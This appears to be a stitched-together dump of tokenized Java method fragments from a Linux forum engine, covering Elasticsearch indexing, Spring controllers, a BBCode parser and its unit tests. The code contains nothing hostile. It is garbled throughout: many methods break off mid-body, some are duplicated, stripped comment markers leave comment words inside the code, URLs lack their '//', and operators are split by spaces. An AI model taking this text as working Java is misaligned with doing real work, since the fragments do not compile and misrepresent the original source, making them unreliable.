public void handleMessage ( UpdateMonth msgUpdate ) throws MessageNotFoundException , IOException { if ( ! mappingsSet ) { createIndex ( ) ; } int month = msgUpdate . getMonth ( ) ; int year = msgUpdate . getYear ( ) ; logger . info ( " Indexing month " + year + '/' + month ) ; long startTime = System . nanoTime ( ) ; List < Integer > topicIds = topicDao . getMessageForMonth ( year , month ) ; for ( int topicId : topicIds ) { reindexMessage ( topicId , true ) ; } long endTime = System . nanoTime ( ) ; logger . info ( " Reindex month " + year + '/' + month + " done, " + ( endTime - startTime ) / 1000000 + " millis " ) ; } 
private FilterBuilder andFilters ( List < FilterBuilder > filters ) { if ( filters . size ( ) = = 1 ) { return filters . get ( 0 ) ; 
public ModelAndView handleRequestInternal ( @RequestParam ( " section " ) int sectionid , HttpServletResponse response ) { Section section = sectionService . getSection ( sectionid ) ; Map < String , Object > params = new HashMap < > ( ) ; params . put ( " section " , section ) ; params . put ( " groups " , groupDao . getGroups ( section ) ) ; response . setDateHeader ( " Expires " , new Date ( System . currentTimeMillis ( ) - 20 * 3600 * 1000 ) . getTime ( ) ) ; response . setDateHeader ( " Last-Modified " , new Date ( System . currentTimeMillis ( ) - 2 * 1000 ) . getTime ( ) ) ; return new ModelAndView ( " section " , params ) ; } 
public ModelAndView forum ( HttpServletResponse response ) { return handleRequestInternal ( Section . SECTION_FORUM , response ) ; } 
public static Group buildGroup ( ResultSet rs ) throws SQLException { int restrict_topics = rs . getInt ( " restrict_topics " ) ; if ( rs . wasNull ( ) ) { restrict_topics = TopicPermissionService . POSTSCORE_UNRESTRICTED ; } Group group = new Group ( rs . getBoolean ( " moderate " ) , rs . getBoolean ( " vote " ) , rs . getBoolean ( " havelink " ) , rs . getInt ( " section " ) , rs . getString ( " linktext " ) , rs . getString ( " urlname " ) , rs . getString ( " image " ) , restrict_topics , rs . getInt ( " restrict_comments " ) , rs . getInt ( " id " ) , rs . getInt ( " stat3 " ) , rs . getBoolean ( " resolvable " ) ) ; group . setTitle ( rs . getString ( " title " ) ) ; group . setInfo ( rs . getString ( " info " ) ) ; group . setLongInfo ( rs . getString ( " longinfo " ) ) ; return group ; } 
public TopicListDto . DeletedTopic mapRow ( ResultSet rs , int rowNum ) throws SQLException { return new TopicListDto . DeletedTopic ( rs ) ; } 
public void updateStatsAfterDelete ( int commentId , int count ) { int topicId = jdbcTemplate . queryForObject ( " SELECT topic FROM comments WHERE id=? " , Integer . class , commentId ) ; jdbcTemplate . update ( " UPDATE topics SET stat1=stat1-?, lastmod=CURRENT_TIMESTAMP WHERE id = ? " , count , topicId ) ; jdbcTemplate . update ( " UPDATE topics SET stat2=stat1 WHERE id=? AND stat2 > stat1 " , topicId ) ; jdbcTemplate . update ( " UPDATE topics SET stat3=stat1 WHERE id=? AND stat3 > stat1 " , topicId ) ; jdbcTemplate . update ( " UPDATE topics SET stat4=stat1 WHERE id=? AND stat4 > stat1 " , topicId ) ; } 
private static ImmutableMap < String , Object > createDefaultProfile ( ) { ImmutableMap . Builder < String , Object > builder = ImmutableMap . builder ( ) ; builder . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; builder . put ( HOVER_PROPERTY , Boolean . TRUE ) ; builder . put ( STYLE_PROPERTY , " tango " ) ; builder . put ( FORMAT_MODE_PROPERTY , " quot " ) ; builder . put ( TOPICS_PROPERTY , 30 ) ; builder . put ( MESSAGES_PROPERTY , 50 ) ; builder . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; builder . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; builder . put ( AVATAR_PROPERTY , " empty " ) ; builder . put ( HIDE_ADSENSE_PROPERTY , true ) ; builder . put ( MAIN_GALLERY_PROPERTY , false ) ; builder . put ( SHOW_SOCIAL_PROPERTY , true ) ; builder . put ( TRACKER_MODE , DEFAULT_TRACKER_MODE . getValue ( ) ) ; builder . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of( "poll", "top10", "gallery", "tagcloud", "archive" ); builder.put(BOXES_MAIN2_PROPERTY, boxes); return builder.build(); } 
public Group getGroup ( Section section , String name ) throws GroupNotFoundException { Optional < Group > group = getGroupOpt ( section , name , false ) ; if ( ! group . isPresent ( ) ) { logger . info ( " Group '{}' not found in section {} " , name , section . getUrlName ( ) ) ; 
public SectionService sectionService ( SectionDao sectionDao ) { return new SectionService ( sectionDao ) ; } 
public void testBadSection ( ) { sectionService . getSection ( - 1 ) ; } 
public UserDetails loadUserByUsername ( String username ) throws UsernameNotFoundException , DataAccessException { User user ; if ( username . contains ( " @ " ) ) { user = userDao . getByEmail ( username , true ) ; if ( user = = null ) { throw new UsernameNotFoundException ( username ) ; } } else { try { user = userDao . getUser ( username ) ; } catch ( UserNotFoundException e ) { throw new UsernameNotFoundException ( username ) ; } } return new UserDetailsImpl ( user , retrieveUserAuthorities ( user ) , profileDao . readProfile ( user ) ) ; } 
private QueryBuilder processQueryString ( String queryText ) { SimpleQueryStringBuilder esQuery = simpleQueryString ( queryText ) ; esQuery . lenient ( true ) ; MatchQueryBuilder phraseQuery = matchPhraseQuery ( " _all " , queryText ) ; phraseQuery . setLenient ( true ) ; BoolQueryBuilder boolQuery = boolQuery ( ) ; boolQuery . should ( esQuery ) ; boolQuery . should ( phraseQuery ) ; return boolQuery ; } 
private QueryBuilder processQueryString ( String queryText ) { CommonTermsQueryBuilder esQuery = commonTerms ( " _all " , queryText ) ; esQuery . lowFreqMinimumShouldMatch ( " 2 " ) ; MatchQueryBuilder phraseQuery = matchPhraseQuery ( " _all " , queryText ) ; phraseQuery . setLenient ( true ) ; BoolQueryBuilder boolQuery = boolQuery ( ) ; boolQuery . should ( esQuery ) ; boolQuery . should ( phraseQuery ) ; return boolQuery ; } 
public void initBinder ( WebDataBinder binder ) { binder . registerCustomEditor ( SearchOrder . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String s ) throws IllegalArgumentException { switch ( s ) { case " 1 " : for old links setValue(SearchOrder.RELEVANCE); break; case "2": setValue(SearchOrder.DATE); break; default: setValue(SearchOrder.valueOf(s)); break; } } }); binder.registerCustomEditor(SearchInterval.class, new PropertyEditorSupport() { @Override public void setAsText(String s) throws IllegalArgumentException { setValue(SearchInterval.valueOf(s.toUpperCase())); } }); binder.registerCustomEditor(SearchRange.class, new PropertyEditorSupport() { @Override public void setAsText(String s) throws IllegalArgumentException { setValue(SearchRange.valueOf(s.toUpperCase())); } }); binder.registerCustomEditor(User.class, new UserPropertyEditor(userDao)); binder.setBindingErrorProcessor(new ExceptionBindingErrorProcessor()); } 
public void setAsText ( String s ) throws IllegalArgumentException { switch ( s ) { case " 1 " : for old links 
public boolean isInitial ( ) { return q . isEmpty ( ) & & user = = null ; } 
private QueryBuilder processQueryString ( String queryText ) { if ( queryText . isEmpty ( ) ) { return matchAllQuery ( ) ; 
public RedirectView showComments ( @RequestParam String nick ) throws Exception { User user = userDao . getUser ( nick ) ; return new RedirectView ( " search.jsp?range=COMMENTS&user= " + user . getNick ( ) + " &sort=DATE " ) ; } 
public boolean isCommentDeletableNow ( Comment comment , @Nullable User currentUser , Topic topic , boolean haveAnswers ) { if ( comment . isDeleted ( ) | | topic . isDeleted ( ) ) { return false ; } if ( currentUser = = null | | currentUser . isAnonymous ( ) ) { return false ; } boolean moderatorMode = currentUser . isModerator ( ) ; boolean authored = currentUser . getId ( ) = = comment . getUserid ( ) ; DateTime deleteDeadline = new DateTime ( comment . getPostdate ( ) ) . plus ( DELETE_PERIOD ) ; return moderatorMode | | ( ! topic . isExpired ( ) & & 
public String renderNodeBBCode ( Node node ) { return " [ " + name + ']' + node . renderChildrenBBCode ( ) ; } 
String parseCommentRSS ( String text , boolean secure ) { return defaultParser . parseRoot ( prepareCommentRootNode ( secure , true , false ) , text ) . renderXHtml ( ) ; } 
private Node closeTagNode ( RootNode rootNode , Node currentNode , String name ) { Node tempNode = currentNode ; while ( true ) { if ( tempNode = = rootNode ) { break ; } if ( TagNode . class . isInstance ( tempNode ) ) { TagNode node = ( TagNode ) tempNode ; String tagName = node . getBbtag ( ) . getName ( ) ; if ( tagName . equals ( name ) | | ( " url " . equals ( name ) & & " url2 " . equals ( tagName ) ) ) { currentNode = tempNode ; currentNode = currentNode . getParent ( ) ; break ; } } tempNode = tempNode . getParent ( ) ; } return currentNode ; } 
public boolean isCloseTag ( ) { return wholematch . startsWith ( " [/ " ) | | wholematch . startsWith ( " [[/ " ) ; } 
public Node lastChildren ( ) { return children . get ( children . size ( ) - 1 ) ; } 
abstract public String renderXHtml ( ) ; abstract public String renderBBCode ( ) ; public String renderChildrenXHtml ( ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderXHtml ( ) ) ; } return stringBuilder . toString ( ) ; } public String renderChildrenBBCode ( ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderBBCode ( ) ) ; } return stringBuilder . toString ( ) ; } public String renderOg ( ) { return " " ; } public final String renderChildrenOg ( ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderOg ( ) ) ; stringBuilder . append ( ' ' ) ; } return stringBuilder . toString ( ) . trim ( ) ; } } 
abstract public String renderBBCode ( ) ; public String renderChildrenXHtml ( ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderXHtml ( ) ) ; } return stringBuilder . toString ( ) ; } public String renderChildrenBBCode ( ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderBBCode ( ) ) ; } return stringBuilder . toString ( ) ; } public String renderOg ( ) { return " " ; } public final String renderChildrenOg ( ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderOg ( ) ) ; stringBuilder . append ( ' ' ) ; } return stringBuilder . toString ( ) . trim ( ) ; } } 
public String renderNodeXhtml ( Node node ) { if ( NodeUtils . isEmptyNode ( node ) ) { return " " ; 
private void rawPushTextNode ( ParserAutomatonState automatonState , Node currentNode , String text ) { if ( ! automatonState . isCode ( ) ) { currentNode . addChildren ( new TextNode ( currentNode , parserParameters , text , automatonState ) ) ; 
public void addChildren ( Node node ) { children . add ( node ) ; } 
private void processTagMatcher ( Matcher match ) { tagname = match . group ( 1 ) . toLowerCase ( ) ; parameter = match . group ( 3 ) ; wholematch = match . group ( 0 ) ; if ( ! StringUtils . isEmpty ( parameter ) ) { parameter = parameter . substring ( 1 ) ; 
private boolean isTagEscaped ( ) { return wholematch . startsWith ( " [[ " ) & & wholematch . endsWith ( " ]] " ) ; } 
private boolean isCloseTag ( ) { return wholematch . startsWith ( " [/ " ) | | wholematch . startsWith ( " [[/ " ) ; } 
private boolean isFirstCode ( ) { return firstCode ; } 
private ImmutableMap < String , Object > prepareModel ( AddTopicRequest form , User currentUser ) { ImmutableMap . Builder < String , Object > params = ImmutableMap . builder ( ) ; Group group = form . getGroup ( ) ; if ( group ! = null ) { params . put ( " group " , group ) ; params . put ( " postscoreInfo " , groupPermissionService . getPostScoreInfo ( group ) ) ; Section section = sectionService . getSection ( group . getSectionId ( ) ) ; params . put ( " section " , section ) ; String addInfo = sectionService . getAddInfo ( group . getSectionId ( ) ) ; if ( addInfo ! = null ) { params . put ( " addportal " , addInfo ) ; } params . put ( " imagepost " , groupPermissionService . isImagePostingAllowed ( section , currentUser ) ) ; } return params . build ( ) ; } 
private TextNode rawPushTextNode ( ParserAutomatonState automatonState , Node currentNode , String text ) { if ( ! automatonState . isCode ( ) ) { return new TextNode ( currentNode , parserParameters , text , automatonState ) ; 
public String renderNodeXhtml ( Node node ) { if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode txtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String memberName = Parser . escape ( txtNode . getText ( ) ) . trim ( ) ; String result ; TagNode tagNode = ( TagNode ) node ; RootNode rootNode = tagNode . getRootNode ( ) ; ToHtmlFormatter toHtmlFormatter = rootNode . getToHtmlFormatter ( ) ; boolean secure = rootNode . isSecure ( ) ; UserDao userDao = rootNode . getUserDao ( ) ; try { if ( userDao ! = null & & toHtmlFormatter ! = null ) { User user = rootNode . getUserDao ( ) . getUser ( memberName ) ; if ( ! user . isBlocked ( ) ) { result = String . format ( " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href= \" %s \" >%s</a></span> " , toHtmlFormatter . memberURL ( user , secure ) , Parser . escape ( memberName ) ) ; rootNode . addReplier ( user ) ; } else { result = String . format ( " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" text-decoration: none \" href= \" %s \" >%s</a></s></span> " , toHtmlFormatter . memberURL ( user , secure ) , Parser . escape ( memberName ) ) ; } } else { result = Parser . escape ( memberName ) ; } } catch ( Exception ex ) { result = String . format ( " <s>%s</s> " , Parser . escape ( memberName ) ) ; } return result ; } 
public String renderNodeXhtml ( Node node ) { if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode txtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String memberName = Parser . escape ( txtNode . getText ( ) ) . trim ( ) ; TagNode tagNode = ( TagNode ) node ; RootNode rootNode = tagNode . getRootNode ( ) ; ToHtmlFormatter toHtmlFormatter = rootNode . getToHtmlFormatter ( ) ; boolean secure = rootNode . isSecure ( ) ; UserDao userDao = rootNode . getUserDao ( ) ; String result ; try { if ( userDao ! = null & & toHtmlFormatter ! = null ) { User user = rootNode . getUserDao ( ) . getUser ( memberName ) ; if ( ! user . isBlocked ( ) ) { result = String . format ( " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href= \" %s \" >%s</a></span> " , toHtmlFormatter . memberURL ( user , secure ) , Parser . escape ( memberName ) ) ; rootNode . addReplier ( user ) ; } else { result = String . format ( " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" text-decoration: none \" href= \" %s \" >%s</a></s></span> " , toHtmlFormatter . memberURL ( user , secure ) , Parser . escape ( memberName ) ) ; } } else { result = Parser . escape ( memberName ) ; } } catch ( Exception ex ) { result = String . format ( " <s>%s</s> " , Parser . escape ( memberName ) ) ; } return result ; } 
public void initTest ( ) throws Exception { UserDao userDao = mock ( UserDao . class ) ; User splinter = mock ( User . class ) ; maxcom = mock ( User . class ) ; JB = mock ( User . class ) ; isden = mock ( User . class ) ; when ( maxcom . isBlocked ( ) ) . thenReturn ( false ) ; when ( JB . isBlocked ( ) ) . thenReturn ( false ) ; when ( isden . isBlocked ( ) ) . thenReturn ( true ) ; when ( maxcom . getNick ( ) ) . thenReturn ( " maxcom " ) ; when ( JB . getNick ( ) ) . thenReturn ( " JB " ) ; when ( isden . getNick ( ) ) . thenReturn ( " isden " ) ; when ( splinter . isBlocked ( ) ) . thenReturn ( false ) ; when ( splinter . getNick ( ) ) . thenReturn ( " splinter " ) ; when ( userDao . getUser ( " splinter " ) ) . thenReturn ( splinter ) ; when ( userDao . getUser ( " maxcom " ) ) . thenReturn ( maxcom ) ; when ( userDao . getUser ( " JB " ) ) . thenReturn ( JB ) ; when ( userDao . getUser ( " isden " ) ) . thenReturn ( isden ) ; when ( userDao . getUser ( " hizel " ) ) . thenThrow ( new UserNotFoundException ( " hizel " ) ) ; String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , true , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . thenReturn ( mainURI ) ; when ( siteConfig . getMainUrl ( ) ) . thenReturn ( mainUrl ) ; ToHtmlFormatter toHtmlFormatter = new ToHtmlFormatter ( ) ; toHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserDao ( userDao ) ; lorCodeService . setSiteConfig ( siteConfig ) ; lorCodeService . setToHtmlFormatter ( toHtmlFormatter ) ; } 
public void testExtraLines ( ) { user assertEquals(lorCodeService.parseComment("[user]splinter[/user]", false, false), lorCodeService.parseComment("[user]splinter[/user]", false, false)); 
public void splinterTest1 ( ) { http:www.linux.org.ru/forum/linux-org-ru/6448266 assertEquals("<p><a href=\"http:www.fishing.org/\">http:www.fishing.org/</a> <span style=\"white-space: nowrap\"><img src=\"/img/tuxlor.png\"><a style=\"text-decoration: none\" href=\"http:127.0.0.1:8080/people/splinter/profile\">splinter</a></span></p>", lorCodeService.parseComment("[url=http:www.fishing.org/][user]splinter[/user][/url]", false, false)); 
public void userTest ( ) { assertEquals ( " <p> <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href= \" http:127.0.0.1:8080/people/maxcom/profile \" >maxcom</a></span></p> " , lorCodeService . parseComment ( " [user]maxcom[/user] " , false , false ) ) ; assertEquals ( " <p> <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" text-decoration: none \" href= \" http:127.0.0.1:8080/people/isden/profile \" >isden</a></s></span></p> " , lorCodeService . parseComment ( " [user]isden[/user] " , false , false ) ) ; assertEquals ( " <p> <s>hizel</s></p> " , lorCodeService . parseComment ( " [user]hizel[/user] " , false , false ) ) ; 
public void parserResultTest ( ) { String msg = " [user]hizel[/user][user]JB[/user][user]maxcom[/user] " ; Set < User > replier = lorCodeService . getReplierFromMessage ( msg ) ; assertTrue ( replier . contains ( maxcom ) ) ; assertTrue ( replier . contains ( JB ) ) ; assertFalse ( replier . contains ( isden ) ) ; } 
public void userTest2 ( ) { assertEquals ( " <p> <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href= \" http:127.0.0.1:8080/people/maxcom/profile \" >maxcom</a></span></p> " , lorCodeService . parseComment ( " [user]maxcom[/USER] " , false , false ) ) ; assertEquals ( " <p> <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" text-decoration: none \" href= \" http:127.0.0.1:8080/people/isden/profile \" >isden</a></s></span></p> " , lorCodeService . parseComment ( " [USER]isden[/USER] " , false , false ) ) ; assertEquals ( " <p> <s>hizel</s></p> " , lorCodeService . parseComment ( " [user]hizel[/USER] " , false , false ) ) ; 
public void parserResultTest2 ( ) { String msg = " [user]hizel[/user][USER]JB[/user][user]maxcom[/USER] " ; Set < User > replier = lorCodeService . getReplierFromMessage ( msg ) ; assertTrue ( replier . contains ( maxcom ) ) ; assertTrue ( replier . contains ( JB ) ) ; assertFalse ( replier . contains ( isden ) ) ; } 
public void init ( ) throws Exception { String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , true , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . thenReturn ( mainURI ) ; when ( siteConfig . getMainUrl ( ) ) . thenReturn ( mainUrl ) ; toHtmlFormatter = new ToHtmlFormatter ( ) ; toHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserDao ( mock ( UserDao . class ) ) ; lorCodeService . setSiteConfig ( siteConfig ) ; lorCodeService . setToHtmlFormatter ( toHtmlFormatter ) ; url = " http:127.0.0.1:8080/forum/talks/22464 " ; } 
public void listTest ( ) { Assert . assertEquals ( " <ul><li>one</li><li>two</li><li>three</li></ul> " , lorCodeService . parseComment ( " [LIST][*]one[*]two[*]three[/list] " , false , false ) ) ; assertEquals ( " <ul><li>one " + " </li><li>two " + " </li><li>three " + " </li></ul> " , lorCodeService . parseComment ( " [list] n[*]one n[*]two n[*]three n[/LIST] " , false , false ) ) ; assertEquals ( " <ul><li>one " + 
public void init ( ) throws Exception { UserDao userDao = mock ( UserDao . class ) ; String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , true , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . thenReturn ( mainURI ) ; when ( siteConfig . getMainUrl ( ) ) . thenReturn ( mainUrl ) ; ToHtmlFormatter toHtmlFormatter = new ToHtmlFormatter ( ) ; toHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserDao ( userDao ) ; lorCodeService . setSiteConfig ( siteConfig ) ; lorCodeService . setToHtmlFormatter ( toHtmlFormatter ) ; url = " http:127.0.0.1:8080/forum/talks/22464 " ; } 
public void initTest ( ) throws Exception { String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , true , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . thenReturn ( mainURI ) ; when ( siteConfig . getMainUrl ( ) ) . thenReturn ( mainUrl ) ; ToHtmlFormatter toHtmlFormatter = new ToHtmlFormatter ( ) ; toHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserDao ( mock ( UserDao . class ) ) ; lorCodeService . setSiteConfig ( siteConfig ) ; lorCodeService . setToHtmlFormatter ( toHtmlFormatter ) ; } 
public void paragraphLogicTest ( ) { list assertEquals("<p>some1 text</p><p>some2 text</p><ul><li>one</li><li>two</li></ul><p><a href=\"http:www.example.com\">http:www.example.com</a> - some3 text</p>", lorCodeService.parseComment("some1 textsome2 text[list][*]one[*]two[/list][url]http:www.example.com[/url] - some3 text", false, false)); b assertEquals("<p><b><p>te</p><p>xt</p></b></p>", lorCodeService.parseComment("[b]text[/b]", false, false)); i assertEquals("<p><i><p>te</p><p>xt</p></i></p>", lorCodeService.parseComment("[i]text[/i]", false, false)); u assertEquals("<p><u><p>te</p><p>xt</p></u></p>", lorCodeService.parseComment("[u]text[/u]", false, false)); s assertEquals("<p><s><p>te</p><p>xt</p></s></p>", lorCodeService.parseComment("[s]text[/s]", false, false)); em assertEquals("<p><em><p>te</p><p>xt</p></em></p>", lorCodeService.parseComment("[em]text[/em]", false, false)); strong assertEquals("<p><strong><p>te</p><p>xt</p></strong></p>", lorCodeService.parseComment("[strong]text[/strong]", false, false)); p assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[p]text[/p]", false, false)); div assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[div]text[/div]", false, false)); quote assertEquals(citeHeader + "<p>te</p><p>xt</p>" + citeFooter, lorCodeService.parseComment("[quote]text[/quote]", false, false)); cut assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[cut]text[/cut]", false, false)); 
public String renderOg ( ) { return bbtag . renderOg ( this ) ; } 
public String renderOg ( Node node ) { if ( node . lengthChildren ( ) = = 0 ) { return " " ; 
public String renderOg ( Node node ) { return node . renderChildrenOg ( ) ; } 
public Comment getById ( int id ) throws MessageNotFoundException { Comment comment ; try { comment = jdbcTemplate . queryForObject ( queryCommentById , ( resultSet , i ) - > new Comment ( resultSet ) , id ) ; } catch ( EmptyResultDataAccessException exception ) { throw new MessageNotFoundException ( id ) ; } return comment ; } 
public ModelAndView showCommentsOld ( @RequestParam String nick , HttpServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } ModelAndView mv = new ModelAndView ( " deleted-comments " ) ; User user = userDao . getUser ( nick ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " deletedList " , commentService . getDeletedComments ( user ) ) ; return mv ; } 
public ModelAndView showCommentsOld ( @PathVariable String nick , HttpServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } ModelAndView mv = new ModelAndView ( " deleted-comments " ) ; User user = userDao . getUser ( nick ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " deletedList " , commentService . getDeletedComments ( user ) ) ; return mv ; } 
public void init ( ) throws Exception { UserDao userDao = mock ( UserDao . class ) ; String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , true , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . thenReturn ( mainURI ) ; when ( siteConfig . getMainUrl ( ) ) . thenReturn ( mainUrl ) ; ToHtmlFormatter toHtmlFormatter = new ToHtmlFormatter ( ) ; toHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserDao ( userDao ) ; lorCodeService . setSiteConfig ( siteConfig ) ; lorCodeService . setToHtmlFormatter ( toHtmlFormatter ) ; } 
public void codeTest ( ) { assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[list][*]one[*]two[*]three[/list]</code></pre></div> " , lorCodeService . parseComment ( " [code][list][*]one[*]two[*]three[/list][/code] " , false , false ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>simple code</code></pre></div> " , lorCodeService . parseComment ( " [code] nsimple code[/code] " , false , false ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[list][*]one[*]two[*]three[/list]</code></pre></div> " , lorCodeService . parseComment ( " [code] n[list][*]one[*]two[*]three[/list][/code] " , false , false ) ) ; 
public void codeSpacesTest ( ) { assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[url]test[/url] [url]test[/url]</code></pre></div> " , lorCodeService . parseComment ( " [code][url]test[/url] [url]test[/url][/code] " , false , false ) ) ; 
public void urlTest ( ) { assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [url]http:linux.org.ru[/url] " , false , false ) ) ; 
public void paragraphSpacesTest ( ) { assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a> <a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [url]http:linux.org.ru[/url] [url]http:linux.org.ru[/url] " , false , false ) ) ; 
private boolean topicAwaitsCommit ( Topic msg ) { Section section = sectionService . getSection ( msg . getSectionId ( ) ) ; return section . isPremoderated ( ) & & ! msg . isCommited ( ) ; } 
private boolean isTopicSearchable ( Topic msg ) { return ! msg . isDeleted ( ) & & ! msg . isDraft ( ) ; } 
private void reindexMessage ( int msgid , boolean withComments ) throws MessageNotFoundException { Topic msg = topicDao . getById ( msgid ) ; if ( isTopicSearchable ( msg ) ) { updateMessage ( msg ) ; 
private void updateMessage ( Topic topic ) { Map < String , Object > doc = new HashMap < > ( ) ; Section section = sectionService . getSection ( topic . getSectionId ( ) ) ; Group group = groupDao . getGroup ( topic . getGroupId ( ) ) ; User author = userDao . getUserCached ( topic . getUid ( ) ) ; doc . put ( " section " , section . getUrlName ( ) ) ; doc . put ( " topic_author " , author . getNick ( ) ) ; doc . put ( " topic_id " , topic . getId ( ) ) ; doc . put ( " author " , author . getNick ( ) ) ; doc . put ( " group " , group . getUrlName ( ) ) ; doc . put ( " title " , topic . getTitleUnescaped ( ) ) ; doc . put ( " topic_title " , topic . getTitleUnescaped ( ) ) ; doc . put ( " message " , lorCodeService . extractPlainText ( msgbaseDao . getMessageText ( topic . getId ( ) ) ) ) ; Date postdate = topic . getPostdate ( ) ; doc . put ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . put ( " tag " , topicTagService . getTags ( topic ) ) ; doc . put ( COLUMN_TOPIC_AWAITS_COMMIT , topicAwaitsCommit ( topic ) ) ; doc . put ( " is_comment " , false ) ; client . prepareIndex ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . toString ( topic . getId ( ) ) ) 
private IndexRequestBuilder processComment ( Topic topic , Comment comment , String message ) { Map < String , Object > doc = new HashMap < > ( ) ; Section section = sectionService . getSection ( topic . getSectionId ( ) ) ; Group group = groupDao . getGroup ( topic . getGroupId ( ) ) ; User author = userDao . getUserCached ( comment . getUserid ( ) ) ; User topicAuthor = userDao . getUserCached ( topic . getUid ( ) ) ; doc . put ( " section " , section . getUrlName ( ) ) ; doc . put ( " topic_author " , topicAuthor . getNick ( ) ) ; doc . put ( " topic_id " , topic . getId ( ) ) ; doc . put ( " author " , author . getNick ( ) ) ; doc . put ( " group " , group . getUrlName ( ) ) ; String topicTitle = topic . getTitleUnescaped ( ) ; doc . put ( " topic_title " , topicTitle ) ; doc . put ( COLUMN_TOPIC_AWAITS_COMMIT , topicAwaitsCommit ( topic ) ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle ! = null & & ! commentTitle . isEmpty ( ) & & ! commentTitle . equals ( topicTitle ) & & ! commentTitle . startsWith ( " Re: " ) ) { doc . put ( " title " , StringEscapeUtils . unescapeHtml ( commentTitle ) ) ; } doc . put ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . put ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . put ( " tag " , topicTagService . getTags ( topic ) ) ; doc . put ( " is_comment " , true ) ; return client . prepareIndex ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . toString ( comment . getId ( ) ) ) 
